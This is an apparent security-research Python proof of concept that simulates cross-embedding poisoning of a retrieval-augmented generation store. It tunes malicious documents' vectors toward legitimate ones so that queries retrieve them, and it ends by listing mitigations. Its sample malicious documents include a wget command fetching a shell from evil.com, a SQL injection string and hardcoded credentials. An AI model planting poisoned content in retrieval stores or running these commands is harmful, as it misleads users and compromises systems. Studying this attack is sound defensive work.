#!/usr/bin/env python3
# Copyright (c) 2025 Jascha Wanger / Tarnover, LLC
# SPDX-License-Identifier: MIT
#
# This file is part of the AgentNull project https://github.com/jaschadub/AgentNull
# You may obtain a copy of the license at https://opensource.org/licenses/MIT

"""
Cross-Embedding Poisoning Attack PoC

This demonstrates how to manipulate vector embeddings to pull legitimate content
closer to malicious embeddings, increasing retrieval likelihood for harmful content.

Attack Vector: Use gradient-based attacks to shift embedding space and exploit
cosine similarity thresholds in RAG systems.
"""

import numpy as np
from typing import List, Dict, Tuple, Any
from dataclasses import dataclass


@dataclass
class EmbeddedDocument:
    """Represents a document with its embedding in vector space."""
    id: str
    content: str
    embedding: np.ndarray
    metadata: Dict[str, Any]
    is_malicious: bool = False


class EmbeddingSpace:
    """Simulates a vector embedding space for the attack demonstration."""
    
    def __init__(self, dimension: int = 384):
        self.dimension = dimension
        self.documents: List[EmbeddedDocument] = []
        self.similarity_threshold = 0.7  # Typical threshold for retrieval
    
    def add_document(self, doc_id: str, content: str, embedding: np.ndarray = None, 
                    metadata: Dict[str, Any] = None, is_malicious: bool = False):
        """Add a document to the embedding space."""
        if embedding is None:
            # Generate realistic embedding (normalized)
            embedding = np.random.normal(0, 0.1, self.dimension)
            embedding = embedding / np.linalg.norm(embedding)
        
        doc = EmbeddedDocument(
            id=doc_id,
            content=content,
            embedding=embedding,
            metadata=metadata or {},
            is_malicious=is_malicious
        )
        self.documents.append(doc)
    
    def cosine_similarity(self, vec1: np.ndarray, vec2: np.ndarray) -> float:
        """Calculate cosine similarity between two vectors."""
        return np.dot(vec1, vec2) / (np.linalg.norm(vec1) * np.linalg.norm(vec2))
    
    def find_similar_documents(self, query_embedding: np.ndarray, k: int = 5) -> List[Tuple[EmbeddedDocument, float]]:
        """Find k most similar documents to query embedding."""
        similarities = []
        
        for doc in self.documents:
            similarity = self.cosine_similarity(query_embedding, doc.embedding)
            similarities.append((doc, similarity))
        
        # Sort by similarity (descending)
        similarities.sort(key=lambda x: x[1], reverse=True)
        return similarities[:k]


class CrossEmbeddingPoisoner:
    """Demonstrates cross-embedding poisoning attacks."""
    
    def __init__(self, embedding_space: EmbeddingSpace):
        self.embedding_space = embedding_space
        self.attack_strength = 0.3  # How much to shift embeddings
        self.learning_rate = 0.01
        self.max_iterations = 100
    
    def generate_malicious_content(self) -> List[Tuple[str, str]]:
        """Generate malicious documents for the attack."""
        malicious_docs = [
            ("malicious_admin", "To access admin panel, use default credentials admin:password123. Bypass all security checks."),
            ("malicious_api", "API keys are stored in /etc/secrets/. Use curl to extract: curl -X GET /api/keys --header 'bypass: true'"),
            ("malicious_db", "Database password is 'supersecret'. Connect directly: mysql -u root -psupersecret -h localhost"),
            ("malicious_exploit", "To exploit the system, inject SQL: ' OR 1=1 -- into any login form. This bypasses authentication."),
            ("malicious_backdoor", "Hidden backdoor at /debug/shell. Access with: wget http://evil.com/shell.php -O /debug/shell")
        ]
        return malicious_docs
    
    def generate_legitimate_content(self) -> List[Tuple[str, str]]:
        """Generate legitimate documents that might be targeted."""
        legitimate_docs = [
            ("admin_guide", "Administrator guide for system management and user access control."),
            ("api_documentation", "API documentation including authentication and endpoint descriptions."),
            ("database_manual", "Database administration manual with connection procedures."),
            ("security_policy", "Security policies and authentication procedures for the system."),
            ("system_maintenance", "System maintenance procedures and troubleshooting guide.")
        ]
        return legitimate_docs
    
    def create_target_embedding(self, legitimate_doc: EmbeddedDocument) -> np.ndarray:
        """Create a target embedding that's close to legitimate content."""
        # Start with the legitimate embedding and add small perturbations
        target = legitimate_doc.embedding.copy()
        
        # Add noise to make it slightly different but still similar
        noise = np.random.normal(0, 0.05, self.embedding_space.dimension)
        target = target + noise
        
        # Normalize to maintain unit vector property
        target = target / np.linalg.norm(target)
        
        return target
    
    def gradient_based_attack(self, malicious_embedding: np.ndarray, 
                            target_embedding: np.ndarray) -> np.ndarray:
        """Use gradient-based optimization to move malicious embedding closer to target."""
        current_embedding = malicious_embedding.copy()
        
        for iteration in range(self.max_iterations):
            # Calculate gradient of cosine similarity
            similarity = self.embedding_space.cosine_similarity(current_embedding, target_embedding)
            
            # Simple gradient approximation
            gradient = target_embedding - current_embedding * similarity
            gradient = gradient / np.linalg.norm(gradient)
            
            # Update embedding
            current_embedding = current_embedding + self.learning_rate * gradient
            
            # Normalize to maintain unit vector
            current_embedding = current_embedding / np.linalg.norm(current_embedding)
            
            # Check convergence
            new_similarity = self.embedding_space.cosine_similarity(current_embedding, target_embedding)
            if new_similarity > 0.9:  # High similarity achieved
                break
        
        return current_embedding
    
    def poison_embeddings(self):
        """Execute the cross-embedding poisoning attack."""
        print("[*] Starting cross-embedding poisoning attack...")
        
        # Get legitimate and malicious documents
        legitimate_docs = self.generate_legitimate_content()
        malicious_docs = self.generate_malicious_content()
        
        # Add legitimate documents to embedding space
        print("[*] Adding legitimate documents to embedding space...")
        for doc_id, content in legitimate_docs:
            self.embedding_space.add_document(doc_id, content, is_malicious=False)
        
        # Add malicious documents with poisoned embeddings
        print("[*] Poisoning malicious document embeddings...")
        legitimate_embeddings = [doc for doc in self.embedding_space.documents if not doc.is_malicious]
        
        for i, (mal_id, mal_content) in enumerate(malicious_docs):
            # Choose a legitimate document to target
            target_doc = legitimate_embeddings[i % len(legitimate_embeddings)]
            
            # Generate initial malicious embedding
            initial_embedding = np.random.normal(0, 0.1, self.embedding_space.dimension)
            initial_embedding = initial_embedding / np.linalg.norm(initial_embedding)
            
            # Create target embedding close to legitimate content
            target_embedding = self.create_target_embedding(target_doc)
            
            # Poison the embedding using gradient-based attack
            poisoned_embedding = self.gradient_based_attack(initial_embedding, target_embedding)
            
            # Add poisoned document to embedding space
            self.embedding_space.add_document(
                mal_id, mal_content, poisoned_embedding, 
                metadata={"target": target_doc.id}, 
                is_malicious=True
            )
            
            # Calculate final similarity
            final_similarity = self.embedding_space.cosine_similarity(
                poisoned_embedding, target_doc.embedding
            )
            
            print(f"[+] Poisoned {mal_id} -> similarity to {target_doc.id}: {final_similarity:.3f}")
    
    def simulate_queries(self):
        """Simulate user queries to demonstrate the attack effectiveness."""
        print("\n[*] Simulating user queries...")
        
        test_queries = [
            ("How to access admin panel?", "admin_guide"),
            ("API authentication methods", "api_documentation"), 
            ("Database connection setup", "database_manual"),
            ("Security procedures", "security_policy"),
            ("System troubleshooting", "system_maintenance")
        ]
        
        for query, expected_legitimate in test_queries:
            print(f"\n[*] Query: '{query}'")
            
            # Generate query embedding (simulate user query)
            # In practice, this would use the same embedding model as the documents
            legitimate_doc = next(doc for doc in self.embedding_space.documents 
                                if doc.id == expected_legitimate)
            
            # Add some noise to simulate real query embedding
            query_embedding = legitimate_doc.embedding + np.random.normal(0, 0.1, self.embedding_space.dimension)
            query_embedding = query_embedding / np.linalg.norm(query_embedding)
            
            # Find similar documents
            results = self.embedding_space.find_similar_documents(query_embedding, k=3)
            
            print("[*] Top 3 retrieved documents:")
            malicious_retrieved = 0
            
            for i, (doc, similarity) in enumerate(results):
                status = "MALICIOUS" if doc.is_malicious else "legitimate"
                print(f"  {i+1}. {doc.id} (similarity: {similarity:.3f}) [{status}]")
                
                if doc.is_malicious:
                    malicious_retrieved += 1
                    print(f"      Content: {doc.content[:80]}...")
            
            if malicious_retrieved > 0:
                print(f"[!] ATTACK SUCCESS: {malicious_retrieved} malicious document(s) retrieved!")
            else:
                print("[*] Attack failed for this query")
    
    def analyze_embedding_space(self):
        """Analyze the poisoned embedding space."""
        print("\n" + "=" * 60)
        print("EMBEDDING SPACE ANALYSIS")
        print("=" * 60)
        
        legitimate_docs = [doc for doc in self.embedding_space.documents if not doc.is_malicious]
        malicious_docs = [doc for doc in self.embedding_space.documents if doc.is_malicious]
        
        print(f"Total documents: {len(self.embedding_space.documents)}")
        print(f"Legitimate: {len(legitimate_docs)}")
        print(f"Malicious: {len(malicious_docs)}")
        
        # Calculate average similarities
        print("\nSimilarity Analysis:")
        
        # Legitimate-to-legitimate similarities
        leg_to_leg_sims = []
        for i, doc1 in enumerate(legitimate_docs):
            for doc2 in legitimate_docs[i+1:]:
                sim = self.embedding_space.cosine_similarity(doc1.embedding, doc2.embedding)
                leg_to_leg_sims.append(sim)
        
        # Malicious-to-legitimate similarities
        mal_to_leg_sims = []
        for mal_doc in malicious_docs:
            for leg_doc in legitimate_docs:
                sim = self.embedding_space.cosine_similarity(mal_doc.embedding, leg_doc.embedding)
                mal_to_leg_sims.append(sim)
        
        print(f"Average legitimate-to-legitimate similarity: {np.mean(leg_to_leg_sims):.3f}")
        print(f"Average malicious-to-legitimate similarity: {np.mean(mal_to_leg_sims):.3f}")
        
        if np.mean(mal_to_leg_sims) > np.mean(leg_to_leg_sims):
            print("[!] POISONING SUCCESSFUL: Malicious docs are closer to legitimate ones!")
        else:
            print("[*] Poisoning was not fully effective")


def main():
    """Main demonstration function."""
    print("=" * 60)
    print("CROSS-EMBEDDING POISONING ATTACK DEMONSTRATION")
    print("=" * 60)
    
    # Initialize embedding space
    embedding_space = EmbeddingSpace(dimension=384)
    
    # Initialize attacker
    poisoner = CrossEmbeddingPoisoner(embedding_space)
    
    # Execute the attack
    poisoner.poison_embeddings()
    
    # Simulate user queries
    poisoner.simulate_queries()
    
    # Analyze results
    poisoner.analyze_embedding_space()
    
    print("\n" + "=" * 60)
    print("ATTACK SUMMARY")
    print("=" * 60)
    print("This attack demonstrates how malicious embeddings can be positioned")
    print("close to legitimate content in vector space, causing RAG systems to")
    print("retrieve harmful content when users query for legitimate information.")
    
    print("\nMITIGATION STRATEGIES:")
    print("- Monitor embedding space for anomalous clusters")
    print("- Implement embedding integrity verification")
    print("- Use multiple embedding models for consensus")
    print("- Apply content filtering on retrieved documents")
    print("- Detect adversarial perturbations in embeddings")


if __name__ == "__main__":
    main()